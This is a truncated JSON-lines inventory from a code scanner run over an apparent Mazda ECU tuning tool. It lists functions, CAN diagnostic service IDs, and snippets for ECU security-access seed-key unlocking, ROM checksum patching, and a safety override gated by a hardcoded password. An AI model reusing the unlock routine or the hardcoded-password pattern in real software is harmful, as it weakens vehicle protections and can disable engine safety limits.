{"file_path": "core/connection_monitor.py", "lines_read": 256, "features_found": [{"type": "function", "name": "__init__", "line": 46}, {"type": "function", "name": "start_monitoring", "line": 72}, {"type": "function", "name": "stop_monitoring", "line": 90}, {"type": "function", "name": "_monitor_loop", "line": 108}, {"type": "function", "name": "_check_connection_health", "line": 123}, {"type": "function", "name": "_update_health_status", "line": 164}, {"type": "function", "name": "_auto_reconnect_if_needed", "line": 190}, {"type": "function", "name": "_notify_health_change", "line": 212}, {"type": "function", "name": "register_health_callback", "line": 220}, {"type": "function", "name": "unregister_health_callback", "line": 225}, {"type": "function", "name": "get_connection_metrics", "line": 231}, {"type": "function", "name": "get_health_status", "line": 236}, {"type": "function", "name": "enable_auto_reconnect", "line": 241}, {"type": "function", "name": "force_health_check", "line": 247}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "core.ecu_communication", "line": null}, {"type": "import", "module": "core.app_state", "line": null}, {"type": "import", "module": "utils.logger", "line": null}, {"type": "import", "module": "threading", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "Enum", "line": null}, {"type": "import", "module": "ECUCommunicator,", "line": null}, {"type": "import", "module": "get_app_state", "line": null}, {"type": "import", "module": "get_logger", "line": null}], "components_found": [{"type": "class", "name": "ConnectionHealth", "line": 21}, {"type": "class", "name": "ConnectionMetrics", "line": 30}, {"type": "class", "name": "ConnectionHealthMonitor", "line": 40}], "algorithms": [], "protocols": [{"type": "protocol", "line": 5, "protocol": "CAN", "content": "Monitors CAN bus connection and provides auto-reconnect"}, {"type": "protocol", "line": 42, "protocol": "CAN", "content": "MONITORS CAN BUS CONNECTION HEALTH AND PROVIDES AUTO-RECONNECT"}, {"type": "protocol", "line": 130, "protocol": "0x[0-9A-Fa-f]+", "content": "response = self.ecu_comm.send_request(0x10, 0x01, timeout=self.response_timeout)"}], "hardware_assumptions": [{"type": "hardware", "line": 5, "hardware": "CAN bus", "content": "Monitors CAN bus connection and provides auto-reconnect"}, {"type": "hardware", "line": 15, "hardware": "ECU", "content": "from core.ecu_communication import ECUCommunicator, ECUState"}, {"type": "hardware", "line": 36, "hardware": "ECU", "content": "consecutive_failures: int = 0"}, {"type": "hardware", "line": 42, "hardware": "CAN bus", "content": "MONITORS CAN BUS CONNECTION HEALTH AND PROVIDES AUTO-RECONNECT"}, {"type": "hardware", "line": 46, "hardware": "ECU", "content": "def __init__(self, ecu_communicator: ECUCommunicator):"}, {"type": "hardware", "line": 47, "hardware": "ECU", "content": "self.ecu_comm = ecu_communicator"}, {"type": "hardware", "line": 63, "hardware": "ECU", "content": "self.max_consecutive_failures = 5"}, {"type": "hardware", "line": 130, "hardware": "ECU", "content": "response = self.ecu_comm.send_request(0x10, 0x01, timeout=self.response_timeout)"}, {"type": "hardware", "line": 139, "hardware": "ECU", "content": "self.metrics.consecutive_failures = 0"}, {"type": "hardware", "line": 154, "hardware": "ECU", "content": "self.metrics.consecutive_failures += 1"}, {"type": "hardware", "line": 156, "hardware": "ECU", "content": "logger.warning(f\"Connection test failed: {self.metrics.consecutive_failures} consecutive failures\")"}, {"type": "hardware", "line": 161, "hardware": "ECU", "content": "self.metrics.consecutive_failures += 1"}, {"type": "hardware", "line": 170, "hardware": "ECU", "content": "if self.metrics.consecutive_failures == 0:"}, {"type": "hardware", "line": 177, "hardware": "ECU", "content": "elif self.metrics.consecutive_failures >= self.max_consecutive_failures:"}, {"type": "hardware", "line": 195, "hardware": "ECU", "content": "self.ecu_comm.get_state() == ECUState.DISCONNECTED):"}, {"type": "hardware", "line": 203, "hardware": "ECU", "content": "if self.ecu_comm.connect():"}, {"type": "hardware", "line": 205, "hardware": "ECU", "content": "self.metrics.consecutive_failures = 0"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "core/data_manager.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "core/ecu_communication.py", "lines_read": 492, "features_found": [{"type": "function", "name": "__init__", "line": 62}, {"type": "function", "name": "connect", "line": 96}, {"type": "function", "name": "disconnect", "line": 135}, {"type": "function", "name": "_test_connection", "line": 150}, {"type": "function", "name": "_validate_safety_before_write", "line": 166}, {"type": "function", "name": "send_request", "line": 220}, {"type": "function", "name": "_wait_for_response", "line": 270}, {"type": "function", "name": "read_vin", "line": 298}, {"type": "function", "name": "read_dtcs", "line": 324}, {"type": "function", "name": "clear_dtcs", "line": 360}, {"type": "function", "name": "read_live_data", "line": 381}, {"type": "function", "name": "unlock_security", "line": 417}, {"type": "function", "name": "_calculate_security_key", "line": 461}, {"type": "function", "name": "get_statistics", "line": 480}, {"type": "function", "name": "is_connected", "line": 485}, {"type": "function", "name": "get_state", "line": 489}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "utils.logger", "line": null}, {"type": "import", "module": "core.safety_validator", "line": null}, {"type": "import", "module": "can", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "threading", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "Enum", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "get_logger", "line": null}, {"type": "import", "module": "get_safety_validator", "line": null}], "components_found": [{"type": "class", "name": "ECUState", "line": 22}, {"type": "class", "name": "ECUResponse", "line": 31}, {"type": "class", "name": "ECUCommunicator", "line": 39}], "algorithms": [{"type": "algorithm_function", "line": 461, "content": "def _calculate_security_key(self, seed: int, level: int) -> int:"}], "protocols": [{"type": "protocol", "line": 46, "protocol": "0x[0-9A-Fa-f]+", "content": "ECU_REQUEST_ID = 0x7E0"}, {"type": "protocol", "line": 47, "protocol": "0x[0-9A-Fa-f]+", "content": "ECU_RESPONSE_ID = 0x7E8"}, {"type": "protocol", "line": 48, "protocol": "0x[0-9A-Fa-f]+", "content": "BROADCAST_ID = 0x7DF"}, {"type": "protocol", "line": 52, "protocol": "0x[0-9A-Fa-f]+", "content": "'DIAGNOSTIC_SESSION': 0x10,"}, {"type": "protocol", "line": 53, "protocol": "0x[0-9A-Fa-f]+", "content": "'ECU_RESET': 0x11,"}, {"type": "protocol", "line": 54, "protocol": "0x[0-9A-Fa-f]+", "content": "'READ_DATA': 0x22,"}, {"type": "protocol", "line": 55, "protocol": "0x[0-9A-Fa-f]+", "content": "'READ_MEMORY': 0x23,"}, {"type": "protocol", "line": 56, "protocol": "0x[0-9A-Fa-f]+", "content": "'SECURITY_ACCESS': 0x27,"}, {"type": "protocol", "line": 57, "protocol": "0x[0-9A-Fa-f]+", "content": "'ROUTINE_CONTROL': 0x31,"}, {"type": "protocol", "line": 58, "protocol": "0x[0-9A-Fa-f]+", "content": "'WRITE_DATA': 0x2E,"}, {"type": "protocol", "line": 59, "protocol": "0x[0-9A-Fa-f]+", "content": "'WRITE_MEMORY': 0x3D"}, {"type": "protocol", "line": 67, "protocol": "CAN", "content": "interface: CAN interface name"}, {"type": "protocol", "line": 68, "protocol": "CAN", "content": "bitrate: CAN bus bitrate"}, {"type": "protocol", "line": 98, "protocol": "CAN", "content": "Connect to CAN bus and initialize ECU communication"}, {"type": "protocol", "line": 110, "protocol": "CAN", "content": "logger.info(f\"Connecting to CAN interface {self.interface}...\")"}, {"type": "protocol", "line": 136, "protocol": "CAN", "content": "\"\"\"Disconnect from CAN bus\"\"\""}, {"type": "protocol", "line": 156, "protocol": "0x[0-9A-Fa-f]+", "content": "0x01,  # Default session"}, {"type": "protocol", "line": 280, "protocol": "0x[0-9A-Fa-f]+", "content": "response_service = message.data[0] | 0x40  # Response ID = Service + 0x40"}, {"type": "protocol", "line": 282, "protocol": "0x[0-9A-Fa-f]+", "content": "if response_service == expected_service | 0x40:"}, {"type": "protocol", "line": 309, "protocol": "0x[0-9A-Fa-f]+", "content": "0x90"}, {"type": "protocol", "line": 337, "protocol": "0x[0-9A-Fa-f]+", "content": "0x13"}, {"type": "protocol", "line": 346, "protocol": "0x[0-9A-Fa-f]+", "content": "if dtc_code != 0x0000:"}, {"type": "protocol", "line": 370, "protocol": "0x[0-9A-Fa-f]+", "content": "0x04  # Clear DTCs"}, {"type": "protocol", "line": 402, "protocol": "0x[0-9A-Fa-f]+", "content": "if pid == 0x0C:  # Engine RPM"}, {"type": "protocol", "line": 404, "protocol": "0x[0-9A-Fa-f]+", "content": "elif pid == 0x0B:  # MAP"}, {"type": "protocol", "line": 406, "protocol": "0x[0-9A-Fa-f]+", "content": "elif pid == 0x10:  # MAF"}, {"type": "protocol", "line": 414, "protocol": "PID", "content": "logger.error(f\"Error reading live data PID 0x{pid:02X}: {e}\")"}, {"type": "protocol", "line": 476, "protocol": "0x[0-9A-Fa-f]+", "content": "key = ((key << 1) | (key >> 31)) ^ 0x12345678"}, {"type": "protocol", "line": 478, "protocol": "0x[0-9A-Fa-f]+", "content": "return key & 0xFFFFFFFF"}], "hardware_assumptions": [{"type": "hardware", "line": 4, "hardware": "ECU", "content": "MAZDASPEED3 ECU COMMUNICATION MODULE"}, {"type": "hardware", "line": 5, "hardware": "ECU", "content": "Core ECU communication interface compatible with all platforms"}, {"type": "hardware", "line": 22, "hardware": "ECU", "content": "class ECUState(Enum):"}, {"type": "hardware", "line": 23, "hardware": "ECU", "content": "\"\"\"ECU connection states\"\"\""}, {"type": "hardware", "line": 31, "hardware": "ECU", "content": "class ECUResponse:"}, {"type": "hardware", "line": 32, "hardware": "ECU", "content": "\"\"\"Container for ECU response data\"\"\""}, {"type": "hardware", "line": 39, "hardware": "ECU", "content": "class ECUCommunicator:"}, {"type": "hardware", "line": 41, "hardware": "ECU", "content": "MAIN ECU COMMUNICATION CLASS"}, {"type": "hardware", "line": 42, "hardware": "ECU", "content": "Universal ECU communication for all MUTS platforms"}, {"type": "hardware", "line": 46, "hardware": "ECU", "content": "ECU_REQUEST_ID = 0x7E0"}, {"type": "hardware", "line": 47, "hardware": "ECU", "content": "ECU_RESPONSE_ID = 0x7E8"}, {"type": "hardware", "line": 53, "hardware": "ECU", "content": "'ECU_RESET': 0x11,"}, {"type": "hardware", "line": 56, "hardware": "ECU", "content": "'SECURITY_ACCESS': 0x27,"}, {"type": "hardware", "line": 64, "hardware": "ECU", "content": "Initialize ECU communicator"}, {"type": "hardware", "line": 68, "hardware": "CAN bus", "content": "bitrate: CAN bus bitrate"}, {"type": "hardware", "line": 73, "hardware": "ECU", "content": "self.state = ECUState.DISCONNECTED"}, {"type": "hardware", "line": 74, "hardware": "ECU", "content": "self.security_level = 0"}, {"type": "hardware", "line": 94, "hardware": "ECU", "content": "logger.info(f\"ECU Communicator initialized for interface {interface}\")"}, {"type": "hardware", "line": 98, "hardware": "ECU", "content": "Connect to CAN bus and initialize ECU communication"}, {"type": "hardware", "line": 98, "hardware": "CAN bus", "content": "Connect to CAN bus and initialize ECU communication"}, {"type": "hardware", "line": 105, "hardware": "ECU", "content": "if self.state != ECUState.DISCONNECTED:"}, {"type": "hardware", "line": 106, "hardware": "ECU", "content": "logger.warning(f\"ECU already connected, state: {self.state}\")"}, {"type": "hardware", "line": 109, "hardware": "ECU", "content": "self.state = ECUState.CONNECTING"}, {"type": "hardware", "line": 121, "hardware": "ECU", "content": "self.state = ECUState.CONNECTED"}, {"type": "hardware", "line": 122, "hardware": "ECU", "content": "logger.info(\"ECU connection established successfully\")"}, {"type": "hardware", "line": 125, "hardware": "ECU", "content": "self.state = ECUState.ERROR"}, {"type": "hardware", "line": 126, "hardware": "ECU", "content": "logger.error(\"ECU connection test failed\")"}, {"type": "hardware", "line": 130, "hardware": "ECU", "content": "logger.error(f\"Failed to connect to ECU: {e}\")"}, {"type": "hardware", "line": 131, "hardware": "ECU", "content": "self.state = ECUState.ERROR"}, {"type": "hardware", "line": 136, "hardware": "CAN bus", "content": "\"\"\"Disconnect from CAN bus\"\"\""}, {"type": "hardware", "line": 143, "hardware": "ECU", "content": "self.state = ECUState.DISCONNECTED"}, {"type": "hardware", "line": 145, "hardware": "ECU", "content": "logger.info(\"ECU disconnected\")"}, {"type": "hardware", "line": 151, "hardware": "ECU", "content": "\"\"\"Test ECU connection with diagnostic session\"\"\""}, {"type": "hardware", "line": 221, "hardware": "ECU", "content": "data: bytes = b'', timeout: float = 2.0) -> ECUResponse:"}, {"type": "hardware", "line": 223, "hardware": "ECU", "content": "Send diagnostic request to ECU"}, {"type": "hardware", "line": 232, "hardware": "ECU", "content": "ECUResponse: Response from ECU"}, {"type": "hardware", "line": 236, "hardware": "ECU", "content": "if self.state == ECUState.DISCONNECTED:"}, {"type": "hardware", "line": 237, "hardware": "ECU", "content": "raise ConnectionError(\"ECU not connected\")"}, {"type": "hardware", "line": 241, "hardware": "ECU", "content": "return ECUResponse(False, b'', time.time(), error_code=-4)"}, {"type": "hardware", "line": 248, "hardware": "ECU", "content": "arbitration_id=self.ECU_REQUEST_ID,"}, {"type": "hardware", "line": 268, "hardware": "ECU", "content": "return ECUResponse(False, b'', time.time(), error_code=-1)"}, {"type": "hardware", "line": 270, "hardware": "ECU", "content": "def _wait_for_response(self, expected_service: int, timeout: float) -> ECUResponse:"}, {"type": "hardware", "line": 271, "hardware": "ECU", "content": "\"\"\"Wait for ECU response\"\"\""}, {"type": "hardware", "line": 278, "hardware": "ECU", "content": "if message and message.arbitration_id == self.ECU_RESPONSE_ID:"}, {"type": "hardware", "line": 284, "hardware": "ECU", "content": "return ECUResponse("}, {"type": "hardware", "line": 292, "hardware": "ECU", "content": "return ECUResponse(False, b'', time.time(), error_code=-2)"}, {"type": "hardware", "line": 296, "hardware": "ECU", "content": "return ECUResponse(False, b'', time.time(), error_code=-3)"}, {"type": "hardware", "line": 300, "hardware": "vehicle", "content": "Read Vehicle Identification Number"}, {"type": "hardware", "line": 369, "hardware": "ECU", "content": "self.SERVICES['ECU_RESET'],"}, {"type": "hardware", "line": 417, "hardware": "ECU", "content": "def unlock_security(self, level: int = 3) -> bool:"}, {"type": "hardware", "line": 419, "hardware": "ECU", "content": "Unlock ECU security access"}, {"type": "hardware", "line": 422, "hardware": "ECU", "content": "level: Security level to unlock"}, {"type": "hardware", "line": 430, "hardware": "ECU", "content": "self.SERVICES['SECURITY_ACCESS'],"}, {"type": "hardware", "line": 435, "hardware": "ECU", "content": "logger.error(\"Failed to request security seed\")"}, {"type": "hardware", "line": 440, "hardware": "ECU", "content": "key = self._calculate_security_key(seed, level)"}, {"type": "hardware", "line": 444, "hardware": "ECU", "content": "self.SERVICES['SECURITY_ACCESS'],"}, {"type": "hardware", "line": 450, "hardware": "ECU", "content": "self.security_level = level"}, {"type": "hardware", "line": 451, "hardware": "ECU", "content": "logger.info(f\"Security unlocked to level {level}\")"}, {"type": "hardware", "line": 454, "hardware": "ECU", "content": "logger.error(\"Security unlock failed\")"}, {"type": "hardware", "line": 458, "hardware": "ECU", "content": "logger.error(f\"Error unlocking security: {e}\")"}, {"type": "hardware", "line": 461, "hardware": "ECU", "content": "def _calculate_security_key(self, seed: int, level: int) -> int:"}, {"type": "hardware", "line": 463, "hardware": "ECU", "content": "Calculate security key from seed"}, {"type": "hardware", "line": 466, "hardware": "ECU", "content": "seed: Security seed from ECU"}, {"type": "hardware", "line": 467, "hardware": "ECU", "content": "level: Security level"}, {"type": "hardware", "line": 486, "hardware": "ECU", "content": "\"\"\"Check if ECU is connected\"\"\""}, {"type": "hardware", "line": 487, "hardware": "ECU", "content": "return self.state in [ECUState.CONNECTED, ECUState.AUTHENTICATED]"}, {"type": "hardware", "line": 489, "hardware": "ECU", "content": "def get_state(self) -> ECUState:"}, {"type": "hardware", "line": 490, "hardware": "ECU", "content": "\"\"\"Get current ECU state\"\"\""}], "security_logic": [{"type": "security_pattern", "line": 27, "pattern": "authenticate", "content": "AUTHENTICATED = \"authenticated\""}, {"type": "security_pattern", "line": 56, "pattern": "security_access", "content": "'SECURITY_ACCESS': 0x27,"}, {"type": "security_pattern", "line": 429, "pattern": "seed", "content": "seed_response = self.send_request("}, {"type": "security_pattern", "line": 430, "pattern": "security_access", "content": "self.SERVICES['SECURITY_ACCESS'],"}, {"type": "security_pattern", "line": 431, "pattern": "seed", "content": "level * 2 - 1  # Request seed"}, {"type": "security_pattern", "line": 434, "pattern": "seed", "content": "if not seed_response.success:"}, {"type": "security_pattern", "line": 435, "pattern": "seed", "content": "logger.error(\"Failed to request security seed\")"}, {"type": "security_pattern", "line": 439, "pattern": "seed", "content": "seed = struct.unpack('>I', seed_response.data[:4])[0]"}, {"type": "security_pattern", "line": 440, "pattern": "key", "content": "key = self._calculate_security_key(seed, level)"}, {"type": "security_pattern", "line": 440, "pattern": "seed", "content": "key = self._calculate_security_key(seed, level)"}, {"type": "security_pattern", "line": 443, "pattern": "key", "content": "key_response = self.send_request("}, {"type": "security_pattern", "line": 444, "pattern": "security_access", "content": "self.SERVICES['SECURITY_ACCESS'],"}, {"type": "security_pattern", "line": 445, "pattern": "key", "content": "level * 2,  # Send key"}, {"type": "security_pattern", "line": 446, "pattern": "key", "content": "struct.pack('>I', key)"}, {"type": "security_pattern", "line": 449, "pattern": "key", "content": "if key_response.success:"}, {"type": "security_pattern", "line": 461, "pattern": "key", "content": "def _calculate_security_key(self, seed: int, level: int) -> int:"}, {"type": "security_pattern", "line": 461, "pattern": "seed", "content": "def _calculate_security_key(self, seed: int, level: int) -> int:"}, {"type": "security_pattern", "line": 463, "pattern": "key", "content": "Calculate security key from seed"}, {"type": "security_pattern", "line": 463, "pattern": "seed", "content": "Calculate security key from seed"}, {"type": "security_pattern", "line": 466, "pattern": "seed", "content": "seed: Security seed from ECU"}, {"type": "security_pattern", "line": 470, "pattern": "key", "content": "int: Calculated key"}, {"type": "security_pattern", "line": 474, "pattern": "key", "content": "key = seed"}, {"type": "security_pattern", "line": 474, "pattern": "seed", "content": "key = seed"}, {"type": "security_pattern", "line": 476, "pattern": "key", "content": "key = ((key << 1) | (key >> 31)) ^ 0x12345678"}, {"type": "security_pattern", "line": 478, "pattern": "key", "content": "return key & 0xFFFFFFFF"}, {"type": "security_pattern", "line": 487, "pattern": "authenticate", "content": "return self.state in [ECUState.CONNECTED, ECUState.AUTHENTICATED]"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "core/factory_maps.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "core/limit_finder.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "core/logging_manager.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "core/rom_verifier.py", "lines_read": 269, "features_found": [{"type": "function", "name": "get_rom_verifier", "line": 266}, {"type": "function", "name": "__init__", "line": 44}, {"type": "function", "name": "verify_rom_integrity", "line": 57}, {"type": "function", "name": "_calculate_checksum", "line": 110}, {"type": "function", "name": "_mazda_proprietary_checksum", "line": 141}, {"type": "function", "name": "patch_checksums", "line": 165}, {"type": "function", "name": "verify_before_flash", "line": 217}, {"type": "function", "name": "verify_after_flash", "line": 250}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "utils.logger", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "Enum", "line": null}, {"type": "import", "module": "binascii", "line": null}, {"type": "import", "module": "get_logger", "line": null}, {"type": "import", "module": "crcmod", "line": null}, {"type": "import", "module": "zlib", "line": null}], "components_found": [{"type": "class", "name": "ChecksumType", "line": 20}, {"type": "class", "name": "ChecksumInfo", "line": 29}, {"type": "class", "name": "ROMChecksumVerifier", "line": 38}], "algorithms": [{"type": "algorithm_function", "line": 110, "content": "def _calculate_checksum(self, data: bytes, checksum_type: ChecksumType) -> bytes:"}], "protocols": [{"type": "protocol", "line": 47, "protocol": "0x[0-9A-Fa-f]+", "content": "ChecksumInfo(0x0000, 0x8000, ChecksumType.CRC16),    # Boot sector"}, {"type": "protocol", "line": 48, "protocol": "0x[0-9A-Fa-f]+", "content": "ChecksumInfo(0x8000, 0x78000, ChecksumType.CRC32),  # Main calibration"}, {"type": "protocol", "line": 49, "protocol": "0x[0-9A-Fa-f]+", "content": "ChecksumInfo(0x80000, 0x10000, ChecksumType.MAZDA_PROPRIETARY),  # OS region"}, {"type": "protocol", "line": 50, "protocol": "0x[0-9A-Fa-f]+", "content": "ChecksumInfo(0x90000, 0x70000, ChecksumType.CRC32),  # Secondary calibration"}, {"type": "protocol", "line": 51, "protocol": "0x[0-9A-Fa-f]+", "content": "ChecksumInfo(0x100000, 0x8000, ChecksumType.CRC16), # Security sector"}, {"type": "protocol", "line": 52, "protocol": "0x[0-9A-Fa-f]+", "content": "ChecksumInfo(0x1FF000, 0x1000, ChecksumType.CRC16), # Final checksums"}, {"type": "protocol", "line": 115, "protocol": "0x[0-9A-Fa-f]+", "content": "crc16_func = crcmod.mkCrcFun(0x11021, initCrc=0x0000, rev=False)"}, {"type": "protocol", "line": 121, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum = zlib.crc32(data) & 0xffffffff"}, {"type": "protocol", "line": 147, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum = 0x55AA55AA  # Mazda magic number"}, {"type": "protocol", "line": 153, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum &= 0xffffffff"}, {"type": "protocol", "line": 156, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum ^= 0xAAAAAAAA"}, {"type": "protocol", "line": 157, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum = ((checksum & 0xffff) << 16) | (checksum >> 16)"}, {"type": "protocol", "line": 239, "protocol": "0x[0-9A-Fa-f]+", "content": "critical_region = rom_data[0x8000:0x88000]  # Main calibration area"}], "hardware_assumptions": [{"type": "hardware", "line": 5, "hardware": "ECU", "content": "Verifies ROM integrity before/after flash operations to prevent bricked ECUs"}, {"type": "hardware", "line": 41, "hardware": "ECU", "content": "Critical for preventing bricked ECUs"}, {"type": "hardware", "line": 51, "hardware": "ECU", "content": "ChecksumInfo(0x100000, 0x8000, ChecksumType.CRC16), # Security sector"}, {"type": "hardware", "line": 144, "hardware": "ECU", "content": "Based on reverse engineering of ECU checksum algorithm"}], "security_logic": [{"type": "security_pattern", "line": 9, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 125, "pattern": "hash", "content": "return hashlib.md5(data).digest()"}, {"type": "security_pattern", "line": 128, "pattern": "hash", "content": "return hashlib.sha256(data).digest()"}, {"type": "security_pattern", "line": 144, "pattern": "algorithm", "content": "Based on reverse engineering of ECU checksum algorithm"}, {"type": "security_pattern", "line": 240, "pattern": "hash", "content": "critical_checksum = hashlib.md5(critical_region).hexdigest()"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "core/safety_limits.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "core/safety_validator.py", "lines_read": 321, "features_found": [{"type": "function", "name": "get_safety_validator", "line": 318}, {"type": "function", "name": "__init__", "line": 56}, {"type": "function", "name": "validate_tuning_parameters", "line": 94}, {"type": "function", "name": "validate_live_data", "line": 193}, {"type": "function", "name": "enable_safety_override", "line": 271}, {"type": "function", "name": "disable_safety_override", "line": 295}, {"type": "function", "name": "get_safety_status", "line": 300}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "core.app_state", "line": null}, {"type": "import", "module": "utils.logger", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "Enum", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "get_app_state,", "line": null}, {"type": "import", "module": "get_logger", "line": null}], "components_found": [{"type": "class", "name": "SafetyLevel", "line": 19}, {"type": "class", "name": "SafetyLimits", "line": 27}, {"type": "class", "name": "SafetyViolation", "line": 41}, {"type": "class", "name": "SafetyValidator", "line": 50}], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 28, "hardware": "ECU", "content": "\"\"\"Hard safety limits for ECU parameters\"\"\""}, {"type": "hardware", "line": 53, "hardware": "ECU", "content": "Validates all tuning parameters before ECU writes"}, {"type": "hardware", "line": 193, "hardware": "ECU", "content": "def validate_live_data(self, ecu_data: Dict[str, float]) -> Tuple[bool, List[SafetyViolation]]:"}, {"type": "hardware", "line": 195, "hardware": "ECU", "content": "Validate live ECU data for dangerous conditions"}, {"type": "hardware", "line": 198, "hardware": "ECU", "content": "ecu_data: Current ECU sensor data"}, {"type": "hardware", "line": 207, "hardware": "ECU", "content": "if 'coolant_temp' in ecu_data:"}, {"type": "hardware", "line": 208, "hardware": "ECU", "content": "coolant = ecu_data['coolant_temp']"}, {"type": "hardware", "line": 220, "hardware": "ECU", "content": "if 'oil_pressure' in ecu_data:"}, {"type": "hardware", "line": 221, "hardware": "ECU", "content": "oil_pressure = ecu_data['oil_pressure']"}, {"type": "hardware", "line": 233, "hardware": "ECU", "content": "if 'egt_temp' in ecu_data:"}, {"type": "hardware", "line": 234, "hardware": "ECU", "content": "egt = ecu_data['egt_temp']"}, {"type": "hardware", "line": 246, "hardware": "ECU", "content": "if 'engine_rpm' in ecu_data:"}, {"type": "hardware", "line": 247, "hardware": "ECU", "content": "rpm = ecu_data['engine_rpm']"}], "security_logic": [{"type": "security_pattern", "line": 271, "pattern": "password", "content": "def enable_safety_override(self, password: str) -> bool:"}, {"type": "security_pattern", "line": 276, "pattern": "password", "content": "password: Override password"}, {"type": "security_pattern", "line": 283, "pattern": "password", "content": "if password == \"MUTS_OVERRIDE_2024\":"}, {"type": "security_pattern", "line": 288, "pattern": "password", "content": "logger.error(\"Invalid safety override password\")"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "database/models.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "database/session.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "defaults.yml", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "diagnostic_module.py", "lines_read": 186, "features_found": [{"type": "function", "name": "connect_to_vehicle", "line": 174}, {"type": "function", "name": "__init__", "line": 71}, {"type": "function", "name": "connect_to_vehicle", "line": 77}, {"type": "function", "name": "_initialize_can_protocol", "line": 95}, {"type": "function", "name": "_initialize_kline_protocol", "line": 98}, {"type": "function", "name": "_initialize_mazda_can_protocol", "line": 101}, {"type": "function", "name": "_test_communication", "line": 104}, {"type": "function", "name": "send_diagnostic_message", "line": 122}, {"type": "function", "name": "_get_simulated_response", "line": 132}, {"type": "function", "name": "_build_message", "line": 144}, {"type": "function", "name": "_parse_response", "line": 153}, {"type": "function", "name": "disconnect", "line": 169}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "Enum,", "line": null}, {"type": "import", "module": "dataclass", "line": null}], "components_found": [{"type": "class", "name": "MazdaProtocol", "line": 19}, {"type": "class", "name": "DiagnosticSession", "line": 29}, {"type": "class", "name": "SecurityAccessLevel", "line": 37}, {"type": "class", "name": "DiagnosticMessage", "line": 48}, {"type": "class", "name": "MazdaDiagnosticProtocol", "line": 58}], "algorithms": [], "protocols": [{"type": "protocol", "line": 22, "protocol": "KWP", "content": "ISO_14230_4_KWP = 2"}, {"type": "protocol", "line": 23, "protocol": "CAN", "content": "ISO_15765_4_CAN = 3"}, {"type": "protocol", "line": 24, "protocol": "CAN", "content": "ISO_15765_4_CAN_29 = 4"}, {"type": "protocol", "line": 25, "protocol": "CAN", "content": "MAZDA_CAN_HS = 5"}, {"type": "protocol", "line": 26, "protocol": "CAN", "content": "MAZDA_CAN_MS = 6"}, {"type": "protocol", "line": 27, "protocol": "CAN", "content": "MAZDA_SUB_CAN = 7"}, {"type": "protocol", "line": 31, "protocol": "0x[0-9A-Fa-f]+", "content": "DEFAULT = 0x01"}, {"type": "protocol", "line": 32, "protocol": "0x[0-9A-Fa-f]+", "content": "PROGRAMMING = 0x02"}, {"type": "protocol", "line": 33, 